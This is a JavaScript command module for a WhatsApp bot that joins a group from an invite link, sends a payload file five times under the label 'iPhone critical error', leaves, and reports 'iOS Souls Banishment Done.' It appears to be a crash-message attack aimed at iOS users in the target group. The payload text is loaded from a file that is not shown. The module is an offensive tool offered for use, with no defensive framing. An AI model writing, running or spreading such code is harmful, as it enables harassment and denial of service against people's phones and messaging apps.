const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gsi",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');
        const code = args[0].split('https://chat.whatsapp.com/')[1];
        
        try {
            const jid = await conn.groupAcceptInvite(code);
            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(jid, { 
                    text: "\u200B" + payload,
                    contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɪᴘʜᴏɴᴇ ᴄʀɪᴛɪᴄᴀʟ ᴇʀʀᴏʀ" } }
                });
            }
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: iOS Souls Banishment Done.") });
        } catch (e) { msg.reply("🥀 Target group secured."); }
    }
};
